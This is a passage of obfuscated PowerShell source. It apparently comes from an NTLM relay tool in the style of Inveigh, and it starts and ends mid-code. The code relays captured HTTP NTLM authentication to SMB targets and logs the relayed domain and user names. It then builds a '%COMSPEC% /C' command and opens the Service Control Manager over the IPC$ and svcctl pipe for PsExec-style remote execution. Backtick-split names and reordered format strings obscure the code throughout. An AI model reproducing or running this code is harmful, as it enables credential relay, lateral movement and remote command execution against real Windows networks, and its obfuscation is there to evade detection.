                        ${s`m`B_CL`IeNt_`send} = ${nETbi`os`_Se`SS`Ion_s`E`RVICe} + ${SMb`_`hEaDEr} + ${Sm`B`_dATa}
                    }
                    else
                    {
                        ${S`Mb`2_Mes`sag`E`_ID} += 1
                        ${Pa`cK`ET_smb2_HE`Ader} = &("{4}{3}{5}{2}{1}{0}" -f '2Header','B','SM','c','Get-Pa','ket') 0x01,0x00 ${smb2_mE`sSA`g`E`_id} ${smb2_TR`Ee_`Id} ${S`MB_SEs`sIo`N_iD}
                        ${pA`C`ket_nT`lms`Sp_nE`GO`TIaTE} = &("{6}{0}{2}{5}{7}{1}{4}{3}"-f '-Packe','g','tNTL','e','otiat','MS','Get','SPNe') 0x07,0x82,0x08,0xa2 ${H`T`Tp_requeS`T`_by`TeS}[(${ht`TP_reQu`e`St_bY`T`es}."LeNG`Th"-8)..(${HTt`p_`REQUe`st_bYTEs}."L`EnGTh")]
                        ${sMB2`_`h`EADeR} = &("{0}{2}{4}{5}{3}{1}"-f 'Conve','ketOrderedDictionary','rtF','c','rom-P','a') ${paCkE`T_`S`m`B2_headEr}
                        ${N`TL`mS`SP_negOti`ATe} = &("{0}{6}{3}{1}{8}{2}{7}{5}{4}" -f 'Conver','etO','r','k','y','onar','tFrom-Pac','edDicti','rde') ${Packet_`NtLmSSp`_neGo`TiA`Te}       
                        ${PaCKEt_sM`B`2_D`ATA} = &("{5}{4}{1}{2}{0}{3}"-f'etupReques','cketSMB2Ses','sionS','t','-Pa','Get') ${NTl`mS`sp`_n`EGo`TIaTe}
                        ${SMb`2_Da`TA} = &("{3}{2}{5}{4}{6}{7}{0}{1}" -f'OrderedDictio','nary','n','Co','Fr','vert','om-Packe','t') ${PACkET`_`S`mB2_dAtA}
                        ${pACkEt_N`Et`B`ios_sEsSIOn`_Se`RVICE} = &("{5}{0}{2}{6}{4}{3}{1}"-f'et-PacketNe','nService','tBIO','sio','s','G','SSe') ${SmB2_`H`Ea`deR}."Len`gth" ${sm`B2`_DA`Ta}."LE`N`GTh"
                        ${NetbioS_S`ESsION`_`sERV`ice} = &("{2}{7}{5}{3}{1}{6}{0}{4}" -f'dere','m','Conv','ro','dDictionary','tF','-PacketOr','er') ${p`A`ckEt`_NET`BIOs_Se`ss`IOn`_serV`ice}
                        ${SM`B_cLIenT`_S`e`Nd} = ${Ne`T`BioS_SE`s`siOn_se`RVIce} + ${sm`B2_`heAd`ER} + ${sM`B2_`DaTA}
                    }

                    ${SMB_rel`A`y_cHa`lleNg`E_st`REam}.("{0}{1}" -f 'W','rite').Invoke(${Smb_C`LIEnT`_SE`Nd},0,${sm`B_`c`lieNT_`SEnD}."LenG`Th") > ${N`ULL}
                    ${S`MB_RelA`y`_C`h`A`llEnGE_sTREAM}.("{1}{0}"-f'h','Flus').Invoke()    
                    ${SMB`_`Re`LAy`_c`HALl`EngE_st`R`Eam}.("{1}{0}"-f 'ad','Re').Invoke(${S`mB_cli`EnT_re`cEiVE},0,${sm`B_ClIEnT_rE`C`EIVE}."LeN`gTH") > ${NU`Ll}
                    ${SMb_cL`Ien`T_s`Ta`gE} = ("{0}{1}" -f'e','xit')
                }
            
            }

        }

        return ${sM`B`_`clI`enT`_re`CEivE}
    }

}


${S`mb_Re`laY`_R`EspOn`Se_scRiPT`BL`oCK} =
{
    function SM`BRElaYresp`o`NSe
    {
        param (${sm`B_relay_soc`K`et},${HtTP_rEQU`est`_by`TeS},${s`MB_v`eRsiOn},${sMB_UsE`R`_ID},${SmB`_s`E`SSion_`ID})
    
        ${s`M`B_`clIENt_Receive} = &("{0}{2}{1}"-f'New-Ob','ect','j') ("{2}{1}{0}"-f 'te[]','tem.By','Sys') 1024

        if(${SmB`_RE`l`Ay_sO`cK`Et})
        {
            ${Smb`_`R`eLAY_`RES`po`N`se_STr`eaM} = ${smb`_R`elAy_S`oCKeT}.("{2}{1}{0}{3}"-f'tre','tS','Ge','am').Invoke()
        }

        if(${sMB_VE`RS`I`ON} -eq ("{1}{0}"-f'MB1','S'))
        {
            ${pa`cKEt`_SmB_h`ea`der} = &("{3}{1}{4}{2}{0}"-f 'er','c','BHead','Get-Pa','ketSM') 0x73 0x18 0x01,0x48 0xff,0xff ${iN`VeI`Gh}."pR`oC`EsS_I`d_bYT`ES" ${SMb`_user`_ID}
            ${pAc`kEt`_Sm`B_`heAD`ER}[("{2}{1}{0}{4}{3}" -f 'Header_Us','MB','S','D','erI')] = ${S`mb`_uSER_ID}
            ${pa`cke`T_Ntlmss`P_aUTh} = &("{2}{3}{1}{4}{0}{5}"-f'NTLM','Pac','G','et-','ket','SSPAuth') ${h`Ttp_REq`Ue`ST`_b`YtEs}
            ${sMb`_hE`AD`Er} = &("{0}{5}{9}{4}{3}{8}{7}{6}{2}{1}" -f'Co','ary','tion','de','tOr','nvertF','Dic','ed','r','rom-Packe') ${PackE`T_sMb_`h`ea`dER}
            ${nt`LMS`sP_aU`TH} = &("{2}{5}{1}{3}{0}{6}{4}"-f'n','t','Convert','OrderedDictio','y','From-Packe','ar') ${pA`ck`e`T_Nt`lmss`p_aUTH}      
            ${p`Ac`kET_SM`B_`dAta} = &("{6}{5}{0}{1}{3}{2}{4}"-f 'MB','SessionS','pAndXReques','etu','t','cketS','Get-Pa') ${nTl`MsS`P_AUth}
            ${SM`B_d`A`TA} = &("{3}{5}{6}{2}{8}{1}{7}{4}{0}" -f 'ctionary','etOrd','Fr','Con','Di','ver','t','ered','om-Pack') ${p`AckEt_`s`MB_`DAtA}
            ${PAc`KEt_NE`T`BIOs`_sESsio`N_ServI`Ce} = &("{7}{3}{2}{1}{0}{5}{6}{4}" -f 'ionSer','s','etNetBIOSSes','k','e','v','ic','Get-Pac') ${SMB_`heA`D`ER}."lEN`g`TH" ${smB_d`A`TA}."lENg`TH"
            ${NE`TbiOS_SESsiO`N_s`e`RvI`Ce} = &("{8}{5}{4}{0}{7}{2}{3}{1}{9}{6}"-f 'F','ketOrderedDict','om-Pa','c','t','onver','onary','r','C','i') ${PAc`k`ET_`NETbI`OS_sESsioN_sE`RvICe}
            ${sMB_c`li`enT_`S`end} = ${N`etB`iOs_ses`si`ON_S`ErvICE} + ${s`mb`_H`eadEr} + ${S`Mb_DA`TA}
        }
        else
        {
            ${sMB2`_mEsS`A`Ge_iD} = 3
            ${sM`B2`_`Tre`E_Id} = 0x00,0x00,0x00,0x00
            ${p`ACKET_SmB`2`_Header} = &("{2}{3}{4}{0}{1}"-f 'cketSMB2Head','er','Get','-P','a') 0x01,0x00 ${Sm`B2`_MES`Sage_iD} ${SMb`2`_TR`EE_id} ${S`m`B_SEssiON_`iD}
            ${pAcke`T_N`TL`msSP_a`Uth} = &("{1}{4}{6}{5}{2}{0}{3}"-f 'P','Get','S','Auth','-P','cketNTLMS','a') ${HTtP`_reQu`eS`T_ByTEs}
            ${s`MB2`_h`EADeR} = &("{5}{1}{3}{0}{4}{2}"-f'edDict','rtFrom-Pac','onary','ketOrder','i','Conve') ${PACKet_smb2`_`hE`ADer}
            ${N`Tlms`SP_`AutH} = &("{6}{2}{3}{10}{8}{7}{4}{5}{9}{0}{1}" -f 'D','ictionary','nv','er','ck','etOrdere','Co','a','P','d','tFrom-') ${p`Ac`kEt_`N`TLMsSp`_AutH}        
            ${PacKE`T_S`m`B`2_data} = &("{6}{0}{2}{1}{5}{4}{3}"-f'e','n','tSMB2Sessio','est','Requ','Setup','Get-Pack') ${nT`L`m`ssP_auTh}
            ${SmB2`_dA`TA} = &("{6}{2}{4}{5}{0}{7}{3}{8}{1}"-f'et','ry','v','dDi','ertFrom-','Pack','Con','Ordere','ctiona') ${PAcke`T`_sm`B2_dATa}
            ${pAcKEt_N`e`TbIOs_`S`ESsION_Se`Rv`ICE} = &("{4}{1}{3}{2}{5}{0}"-f 'ervice','t-P','ketNe','ac','Ge','tBIOSSessionS') ${SMb`2_he`ADer}."len`gTh" ${S`MB2_da`Ta}."lE`NG`Th"
            ${NETb`Ios_se`SS`i`On_`SE`RVICE} = &("{6}{9}{1}{8}{3}{2}{5}{0}{7}{4}" -f 're','-Pac','tO','e','onary','rde','ConvertF','dDicti','k','rom') ${p`Ac`kEt_NEt`B`Ios`_Sess`IoN_`ser`ViCe}
            ${S`MB_`cLIeN`T`_se`ND} = ${nEtBi`Os_`sESsi`ON_`sEr`V`i`ce} + ${sMb`2_He`Ad`er} + ${Sm`B2_D`ATa}
        }

        ${SMB_RelA`Y_`ReSpoNS`E`_stream}.("{1}{0}" -f'ite','Wr').Invoke(${sm`B_C`lien`T_send},0,${sMB`_CL`IeNt_S`eND}."l`E`NGTh")
        ${s`MB_R`eLAY_r`E`S`pOnSE_`stR`EaM}.("{0}{1}" -f 'Flu','sh').Invoke()
        ${sMb_`ReL`AY_R`EsPONSe_sT`ReAm}.("{1}{0}"-f 'ad','Re').Invoke(${S`Mb`_cLienT_Rec`ei`Ve},0,${smb_`cliEN`T`_RECE`ive}."Le`N`gtH")

        if((${SMB_Ve`RS`iON} -eq ("{0}{1}"-f'SMB','1') -and  ${w`2e`HX}::"t`OstRI`Ng"(${s`Mb_cli`e`NT_Re`Ce`I`Ve}[9..12]) -eq ("{1}{2}{0}" -f '0','0','0-00-00-0')) -or (${smB`_v`ER`sIon} -ne ("{1}{0}" -f '1','SMB') -and  (&("{1}{2}{0}"-f 'IaBle','GEt-','vAR') ('w'+'2eHx')  -vALue )::"toS`Tri`NG"(${sMB_`clIE`Nt_ReC`ei`VE}[12..15]) -eq ("{1}{0}{3}{2}" -f'0-','0','00-00','00-')))
        {
            ${I`N`VeIgH}."ConsOl`E_QU`E`Ue".("{0}{1}"-f 'A','dd').Invoke(("$HTTP_type "+'t'+'o '+'SM'+'B '+'rel'+'ay'+' '+'authen'+'tica'+'t'+'io'+'n '+'succ'+'e'+'s'+'sful '+'f'+'or '+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'o'+'n '+"$Target"))
            
            if(${I`NV`Eigh}."fi`l`E_oUTPUt")
            {
                ${in`V`eiGH}."LO`G_fil`e_q`UE`UE".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target "))
            }

            if(${I`Nve`IgH}."log_Ou`T`PuT")
            {
                ${iN`VeI`GH}."L`og".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target "))
            }
              
        }
        else
        {
            ${i`NvEI`Gh}."CONso`L`E_qUeue".("{0}{1}"-f'Ad','d').Invoke(("$HTTP_type "+'t'+'o '+'S'+'MB '+'re'+'lay '+'a'+'uthe'+'n'+'ticat'+'ion '+'fai'+'led '+'for'+' '+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'on'+' '+"$Target"))
            ${INv`EI`Gh}."Sm`BrE`L`AY_FAilED`_`LiST".("{1}{0}"-f'd','Ad').Invoke(("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+"$Target"))
            ${sMb_ReLay`_f`A`IlEd} = ${T`Rue}
            ${SMb_`R`ELaY_s`ock`eT}.("{1}{0}" -f'lose','C').Invoke()

            if(${i`Nv`EIgh}."FiLE_ou`T`pUt")
            {
                ${Inv`E`iGh}."lo`G_`FILE`_qUEUE".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target "))
            }

            if(${iN`VeIgH}."LOG`_`OUtpuT")
            {
                ${in`Ve`IgH}."L`oG".("{0}{1}" -f 'Ad','d').Invoke(("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $Target "))
            }

        }

        if(!${S`mB_Rel`AY_Fa`Il`Ed})
        {

            if(!${S`Er`ViCe})
            {
                ${Smb_sE`RV`i`Ce_ra`NDom} =   ( &("{1}{0}"-f'Ir','D')  vaRIAble:G813s5)."V`Alue"::("{1}{0}"-f 'in','Jo').Invoke("00-",(1..20 | &("{0}{3}{2}{1}"-f'For','ct','bje','Each-O'){"{0:X2}-" -f (&("{1}{0}{2}" -f 'et-Rando','G','m') -Minimum 65 -Maximum 90)}))
                ${Smb`_sErvi`Ce} = ${sMB`_`s`E`RViC`e_RanDOm} -replace "-00",""
                ${sMB_`serv`iCe} = ${SMB`_S`Ervi`CE}.("{0}{1}" -f 'Substr','ing').Invoke(0,${s`mb_sEr`ViCe}."LEnG`Th" - 1)
                ${SMb_s`Er`ViCe} = ${sMB`_seRVI`Ce}.("{0}{1}" -f'Spli','t').Invoke("-") | &("{2}{0}{1}" -f 'orE','ach-Object','F'){[Char]  ${k`pa}::("{2}{0}{1}"-f '1','6','ToInt').Invoke(${_},16)}
                ${SmB_`Se`R`VICe} = &("{1}{2}{0}"-f'ct','New-O','bje') ("{2}{0}{3}{4}{1}" -f'm','g','Syste','.S','trin') (${s`M`B_`SErvice},0,${Smb_s`E`RvICe}."leN`GtH")
                ${SMb_`s`ERVicE_R`AN`DOm} += ("{0}{3}{1}{4}{2}" -f '00','00-0','-00','-','0-00')
                ${SM`B_`ServIC`E`_BYtEs} = ${s`Mb_sE`RVIce_RaN`D`om}.("{0}{1}" -f'Spli','t').Invoke("-") | &("{1}{2}{0}" -f'ct','For','Each-Obje'){[Char]  ${k`pa}::("{0}{1}" -f'ToInt','16').Invoke(${_},16)}   
            }
            else
            {
                ${sM`B_s`e`RVICe} = ${s`ERVIcE}
                ${smB_`sE`Rv`ic`E_bYTEs} =   ${oA`kf}::"u`NICO`de".("{1}{2}{0}"-f 'Bytes','G','et').Invoke(${sEr`Vi`cE})

                if([Bool](${smB_`s`erv`iCE}."leng`TH" % 2))
                {
                    ${sM`B_`s`erviC`E_byTes} += 0x00,0x00
                }
                else
                {
                    ${SmB_`SErVICE`_`By`Tes} += 0x00,0x00,0x00,0x00
                
                }

            }

            ${smb`_SERv`IC`e`_lengTH} =   ${w`2EhX}::("{2}{1}{0}" -f's','e','GetByt').Invoke(${S`mB_S`erVIcE}."l`EngtH" + 1)
            ${co`M`maNd} = ('%'+'CO'+'M'+'SPEC% '+'/'+'C '+"`"") + ${c`OMm`And} + "`""
             (&("{2}{0}{1}"-f'AriAb','le','V')  ('o'+'AKF'))."v`AlUE"::"UT`F8".("{0}{2}{1}" -f'GetBy','s','te').Invoke(${c`omMa`ND}) | &("{1}{0}{3}{2}"-f'h-O','ForEac','ject','b'){${p`SE`x`EC_coMm`ANd} += "{0:X2}-00-" -f ${_}}

            if([Bool](${cO`m`MAND}."len`gth" % 2))
            {
                ${PS`EXE`C_cOMm`AnD} += ("{1}{0}"-f'00','00-')
            }
            else
            {
                ${Ps`E`Xec_COMm`AND} += ("{1}{3}{2}{0}" -f'00-00','00-','0-','0')
            }    
        
            ${pSexE`c_`COMmand_bYT`eS} = ${PSEXec_`ComMA`Nd}.("{1}{0}"-f'plit','S').Invoke("-") | &("{3}{1}{2}{0}" -f'ject','Each-O','b','For'){[Char] ${K`PA}::("{1}{0}" -f 'Int16','To').Invoke(${_},16)}  
            ${PSe`Xec_`c`omm`A`ND_LEn`gtH_By`TES} =   ${W`2ehX}::("{1}{0}"-f'tes','GetBy').Invoke(${ps`eXeC_`c`ommand_B`YTES}."L`eNG`Th" / 2)

            ${SM`B_pATH} = "\\" + ${ta`RGeT} + "\IPC$"

            if(${s`Mb`_vErS`ioN} -eq ("{1}{0}" -f'MB1','S'))
            {
                ${smB_pa`Th`_bY`TEs} =   ( &("{2}{1}{3}{0}"-f 'LE','eT-VA','g','RiAB')  oAKf )."VA`lue"::"UT`F8".("{0}{2}{1}" -f'Ge','es','tByt').Invoke(${Smb_p`A`TH}) + 0x00
            }
            else
            {
                ${smb_p`At`H_B`YT`eS} =   (&("{1}{0}{3}{2}" -f 'ET','G','iabLE','-VAr') oAKf)."va`LuE"::"u`NicOdE".("{2}{0}{1}" -f 'y','tes','GetB').Invoke(${sMB`_p`ATh})
            }

            ${SmB_NAmED_`P`Ipe_`UuID} = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03
            ${s`mB_CL`IeNT_`sTReam} = ${SMB_RelAY`_`s`o`ckET}.("{0}{2}{1}"-f'G','ream','etSt').Invoke()
            ${SMB`_sPli`T`_InD`Ex} = 4256

            if(${SM`B`_`VeRSION} -eq ("{1}{0}" -f 'MB1','S'))
            {
                ${sm`B_CL`ie`Nt_`staGe} = ("{3}{1}{5}{0}{2}{4}" -f 'ctAndX','e','R','Tre','equest','Conne')

                :SMB_execute_loop while (${s`MB_c`lIeNt`_sTa`GE} -ne ("{0}{1}"-f'Exi','t'))
                {
            
                    switch (${smB_cl`i`EnT_`S`T`AGE})
                    {
            
                        ("{0}{2}{3}{4}{1}" -f'Tre','est','e','C','onnectAndXRequ')
                        {
                            ${p`AcKet`_sm`B`_he`AdER} = &("{0}{2}{1}{4}{3}" -f 'Get','ck','-Pa','tSMBHeader','e') 0x75 0x18 0x01,0x48 0xff,0xff ${inV`E`igh}."PROC`e`ss_iD`_B`YTES" ${sMB_Us`e`R_id}
                            ${sm`B`_`heAdER} = &("{4}{3}{7}{9}{8}{5}{2}{6}{0}{1}" -f 'o','nary','ict','Fro','Convert','dD','i','m-Pac','e','ketOrder') ${PACkeT_SM`B_`hE`AdEr}   
                            ${pa`cKeT`_sMB_D`AtA} = &("{3}{6}{5}{0}{1}{4}{2}"-f 'ne','ctA','quest','Get','ndXRe','TreeCon','-PacketSMB') ${s`Mb`_paTH_B`yTES}
                            ${sM`B_d`ATA} = &("{5}{3}{2}{4}{0}{1}" -f 'ed','Dictionary','om-Packe','ertFr','tOrder','Conv') ${P`AcK`ET_sMB_`Da`Ta}
                            ${paCKET`_NetB`IoS_se`sS`i`oN_sE`RvI`CE} = &("{5}{0}{1}{6}{2}{4}{3}{7}{8}" -f'e','t-Pac','tNe','on','tBIOSSessi','G','ke','Servic','e') ${Smb_`hE`AD`eR}."LEnG`TH" ${smB_d`A`TA}."L`En`gth"
                            ${Ne`TBI`Os_S`EssION_`Se`R`VIcE} = &("{4}{3}{2}{0}{6}{1}{8}{7}{5}"-f'ac','e','m-P','rtFro','Conve','Dictionary','k','red','tOrde') ${pAc`K`E`T`_NeTBIOS`_sessioN_sERVicE}
                            ${SM`B_Cl`IE`Nt_S`eNd} = ${nEt`BiOs_s`e`Ss`IOn_se`Rvice} + ${SmB_h`ead`er} + ${SM`B_d`AtA}
                            ${sMb_`c`lIE`NT`_`stREam}.("{0}{1}" -f 'Writ','e').Invoke(${SMb_`C`lIEnt_S`E`Nd},0,${S`m`B_c`lIE`NT_SeNd}."LEN`GtH")
                            ${Sm`B`_C`lieNt_STream}.("{1}{0}"-f'ush','Fl').Invoke()
                            ${SMB`_CLIENT_`s`TRE`AM}.("{1}{0}"-f'd','Rea').Invoke(${s`M`B_cLi`EnT_re`Ce`Ive},0,${smB_CL`ie`Nt_`REceivE}."L`E`Ngth")
                            ${smB`_`cL`iENt_sTA`GE} = ("{2}{1}{3}{4}{0}"-f 't','reateAndXR','C','e','ques')
                        }
                  
                        ("{0}{2}{3}{1}" -f'CreateAn','quest','dX','Re')
                        {
                            ${SMB_nA`mED_PiPE`_BYT`ES} = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 
                            ${SM`B_Tr`EE`_iD} = ${SMb_CliENt`_r`e`c`eIVe}[28,29]
                            ${Pa`CKet_sm`B_`HeA`DEr} = &("{4}{1}{0}{2}{3}" -f 'ke','c','tSMBHeade','r','Get-Pa') 0xa2 0x18 0x02,0x28 ${S`mb_t`REe_iD} ${I`Nvei`Gh}."PRO`C`esS_i`D_BYt`Es" ${sm`B_`UsE`R_Id}
                            ${sMb_H`e`A`deR} = &("{4}{2}{0}{7}{3}{9}{5}{1}{6}{8}" -f 'n','rom','o','er','C','F','-PacketOrderedDic','v','tionary','t') ${p`A`CkE`T`_SMb_HE`AdER}   
                            ${PAc`kE`T`_`smB_DaTa} = &("{9}{4}{3}{5}{2}{7}{1}{6}{0}{8}"-f'ques','X','ketSMBNTCre','t-Pa','e','c','Re','ateAnd','t','G') ${sM`B_nAM`ED_P`ipE`_`BYTES}
                            ${sM`B`_`DatA} = &("{3}{2}{6}{5}{1}{4}{7}{0}" -f 'y','OrderedDict','n','Co','i','rtFrom-Packet','ve','onar') ${PaC`kEt_`smb_`Data}
                            ${PACkEt_nETBIoS`_`SessiO`N`_sErv`i`CE} = &("{5}{4}{0}{1}{3}{6}{7}{2}"-f'etN','etBIOSSes','ice','sion','k','Get-Pac','Ser','v') ${SMb_hE`AD`eR}."L`E`NGTH" ${s`mB`_`daTA}."Le`NGTH"
                            ${ne`T`B`iOS_`SesSIOn`_SerVi`Ce} = &("{9}{5}{2}{1}{6}{8}{3}{7}{4}{0}" -f 'ry','d','acketOr','d','ictiona','om-P','e','D','re','ConvertFr') ${P`A`Ck`E`T_ne`TBIos_SesSioN`_Ser`VIce}
                            ${Smb_C`l`Ie`Nt_S`ENd} = ${NETBIos`_Se`ssIO`N`_S`eRVI`ce} + ${sMb`_H`EAdEr} + ${S`m`B_DAtA}
                            ${s`Mb_clIEn`T`_sTr`E`Am}.("{0}{1}" -f'Wr','ite').Invoke(${SM`B_ClI`EN`T_SEnD},0,${Sm`B_cL`iE`Nt`_sEnd}."l`eNgtH")
                            ${Smb`_Cli`en`T_s`TreAm}.("{0}{1}"-f'Flu','sh').Invoke()
                            ${S`MB`_clIEN`T_sT`REaM}.("{0}{1}" -f'Rea','d').Invoke(${smB`_cLIENT_`R`ECEiVE},0,${SM`B_CLienT`_re`cEIVe}."Len`gTh")
                            ${sMb_`clienT`_`ST`Age} = ("{1}{2}{0}"-f 'd','RPCBi','n')
                        }
                
                        ("{1}{0}"-f'CBind','RP')
                        {
                            ${S`MB`_fiD} = ${sm`B`_`cl`IeN`T_recEiVE}[42,43]
                            ${pA`Cket`_s`M`B_HeADER} = &("{3}{1}{0}{2}"-f'e','MBH','ader','Get-PacketS') 0x2f 0x18 0x05,0x28 ${sMB`_`TrEE_id} ${IN`VE`Igh}."pRO`cEs`s_`Id_`BYtES" ${s`MB_U`s`er_iD}
                            ${SmB_h`eAD`Er} = &("{5}{0}{2}{6}{3}{1}{4}"-f 'onv','Dict','ertFrom-P','ketOrdered','ionary','C','ac') ${pacKeT_`s`m`B_`heADeR}
                            ${packET`_`RPC_`dA`Ta} = &("{1}{2}{0}{3}" -f'tRPCB','Get-Pac','ke','ind') 1 0xb8,0x10 0x01 0x00,0x00 ${SMB`_NA`Me`D_pip`E`_uuID} 0x02,0x00
                            ${rPc_d`A`TA} = &("{5}{4}{6}{9}{7}{3}{2}{1}{8}{0}"-f 'y','Ord','et','-Pack','ve','Con','rtF','om','eredDictionar','r') ${pacK`Et_R`PC`_DAtA}
                            ${p`Ack`E`T_sMb_`d`ATA} = &("{2}{3}{4}{1}{0}"-f'Request','dX','Get-','Packet','SMBWriteAn') ${sMB_`F`Id} ${RPC`_D`ATa}."LE`NGTh"
                            ${s`MB`_`daTA} = &("{4}{10}{2}{7}{0}{9}{3}{1}{5}{8}{6}" -f'-','eredD','ver','ketOrd','C','ic','onary','tFrom','ti','Pac','on') ${pa`Ck`ET_smb_`DAtA}
                            ${RPc`_DaT`A_`LE`NgTh} = ${smB_`d`AtA}."leN`g`Th" + ${rp`c_D`ATA}."lE`NgTH"
                            ${PACk`ET_n`ETb`IoS_sESsION`_Se`RV`i`ce} = &("{2}{5}{0}{4}{6}{1}{3}"-f'-PacketNetB','S','Ge','ervice','IOS','t','Session') ${sm`B_heaD`er}."leN`G`TH" ${rpC`_data_`lEn`gTh}
                            ${neTbi`os_seS`s`IoN_sEr`VIce} = &("{7}{1}{2}{5}{0}{4}{6}{3}"-f'er','k','e','ry','edDiction','tOrd','a','ConvertFrom-Pac') ${pa`cKet_Ne`T`BIO`s_seSs`I`On_S`eRVICe}
                            ${S`MB_Clien`T_`seND} = ${NEtbi`OS`_`S`ESsI`o`N_seRV`icE} + ${SMB_H`ea`der} + ${s`mb`_DATA} + ${RpC`_`data}
                            ${SM`B_C`LIeNt_st`R`EaM}.("{1}{0}" -f'e','Writ').Invoke(${s`mB_cL`iE`Nt`_se`Nd},0,${SMb`_CliEn`T`_SE`Nd}."l`En`GtH")
                            ${SMB_cLiE`N`T`_`stR`eam}.("{0}{1}" -f'F','lush').Invoke()
                            ${sMB_cl`iEn`T_st`RE`AM}.("{0}{1}" -f'Rea','d').Invoke(${S`m`B_clieNT_RECe`I`Ve},0,${s`MB_cLIEnT`_`RE`CEIve}."l`eng`TH")
                            ${smb_cL`ie`Nt_`stAGe} = ("{0}{3}{1}{2}"-f 'R','ues','t','eadAndXReq')
                            ${sm`B_`C`LiEnT_STA`Ge_`Ne`xT} = ("{1}{0}{3}{4}{2}"-f 'SC','Open','W','Manage','r')
                        }
               
                        ("{4}{0}{3}{2}{1}" -f'd','st','ue','XReq','ReadAn')
                        {
                            &("{0}{2}{1}" -f'S','t-Sleep','tar') -m 150
                            ${PaC`Ket_s`m`B`_heaD`Er} = &("{1}{4}{2}{3}{0}{5}"-f 'ad','Ge','et','SMBHe','t-Pack','er') 0x2e 0x18 0x05,0x28 ${Smb_TReE`_`id} ${i`NvEI`Gh}."prOcEs`s`_`id`_`ByTes" ${sm`B`_U`SER_iD}
                            ${sMB_H`e`AD`ER} = &("{3}{0}{6}{4}{2}{8}{5}{9}{7}{1}" -f'on','ary','dD','C','ertFrom-PacketOrdere','t','v','n','ic','io') ${PaCk`et`_`SMB_HeA`DeR}   
                            ${pACkEt`_S`mb_Data} = &("{1}{4}{0}{6}{3}{5}{2}" -f'Re','Get-Packe','XRequest','d','tSMB','And','a')
                            ${PAC`KET_`S`mb_D`Ata}[("{0}{2}{1}{4}{3}{5}" -f'SMBReadAnd','Reques','X','_F','t','ID')] = ${SMB`_`FId}
                            ${sMb`_da`Ta} = &("{2}{7}{5}{1}{3}{0}{6}{4}"-f'd','e','ConvertF','re','onary','om-PacketOrd','Dicti','r') ${pAC`K`e`T_`SMB_daTA}
                            ${pa`CKET`_N`ET`BI`os_seSsI`On`_SERVicE} = &("{5}{1}{0}{2}{6}{3}{4}"-f 'tN','e','etBI','ssionS','ervice','Get-Pack','OSSe') ${S`mB_H`e`AdEr}."Le`N`gth" ${sM`B_Da`TA}."l`ENg`Th"
                            ${n`ETbi`OS`_S`ESsIon_`se`RviCE} = &("{0}{7}{2}{6}{4}{3}{5}{1}"-f'Con','y','er','tOrderedDic','ke','tionar','tFrom-Pac','v') ${PaCkEt`_`NeTBIOs`_`SES`S`iON_S`ERVICE}
                            ${sM`B_cliEN`T_`SEND} = ${Netb`i`oS_sE`SSi`ON_se`RVicE} + ${SMb_he`Ad`er} + ${S`mb_`dATa}
                            ${SmB_`cl`iE`Nt_`STReAm}.("{0}{1}" -f'W','rite').Invoke(${sM`B_c`LIen`T_sEnd},0,${smB`_CliE`Nt_s`end}."L`eNGth")
                            ${smB_C`l`iEn`T_s`TrEam}.("{1}{0}"-f'h','Flus').Invoke()
                            ${sMB`_clIe`NT_STr`EaM}.("{0}{1}"-f 'Re','ad').Invoke(${SmB_CLieNT`_re`c`EIve},0,${SMb_c`lie`N`T_RECE`IVe}."len`gTh")
                            ${sM`B`_`Client_ST`AGe} = ${smb_c`lIent`_S`Ta`ge`_NE`XT}
                        }
                
                        ("{0}{2}{1}" -f 'Op','nSCManagerW','e')
                        {
                            ${P`ACK`Et_SMb_h`Ea`der} = &("{2}{5}{6}{1}{3}{0}{4}"-f'ade','cketS','Get','MBHe','r','-','Pa') 0x2f 0x18 0x05,0x28 ${sMB`_`TreE`_ID} ${iNvE`i`Gh}."pR`OcES`S`_iD_BYtES" ${SmB_u`SE`R_Id}
                            ${p`AckET_`sc`m`_d`Ata} = &("{3}{0}{4}{1}{5}{2}" -f 'et-Packe','ag','rW','G','tSCMOpenSCMan','e') ${s`m`B_sE`RvICE`_bytEs} ${SMB_s`E`RVICE`_LeNgtH}
                            ${sCm_D`A`Ta} = &("{8}{0}{2}{1}{3}{4}{7}{6}{5}" -f 'er','o','tFr','m-Packet','Ordere','y','Dictionar','d','Conv') ${pAC`ke`T_sC`M_DAta}
                            ${P`AC`keT_`RpC_D`A`TA} = &("{0}{4}{3}{2}{1}{5}"-f'Ge','eque','R','ketRPC','t-Pac','st') 0x03 ${SCm_D`A`Ta}."le`NG`TH" 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                            ${r`Pc_`dA`Ta} = &("{0}{2}{6}{3}{7}{5}{4}{1}"-f 'ConvertF','onary','r','ck','deredDicti','tOr','om-Pa','e') ${pA`cKEt_Rp`C`_daTa}
                            ${SmB_h`E`ADEr} = &("{4}{3}{1}{6}{5}{0}{2}" -f'dDictionar','rom-Pack','y','F','Convert','ere','etOrd') ${pa`CkEt`_s`M`B_hEAd`er}   
                            ${pAckeT_s`mB`_`dAta} = &("{2}{0}{6}{3}{1}{4}{5}"-f 'a','qu','Get-P','tSMBWriteAndXRe','e','st','cke') ${smb_`FiD} (${rp`c_`Data}."l`ENGTh" + ${sc`M`_DAta}."LE`N`Gth")
                            ${smb`_D`ATA} = &("{0}{6}{4}{2}{3}{1}{5}" -f 'C','rdere','k','etO','m-Pac','dDictionary','onvertFro') ${PAckEt_`SMB_DA`TA}
                            ${rPc`_data_Len`gth} = ${s`mb_D`Ata}."L`EnGTH" + ${Sc`M_dATa}."LE`NG`TH" + ${Rpc`_`daTA}."LE`NGth"
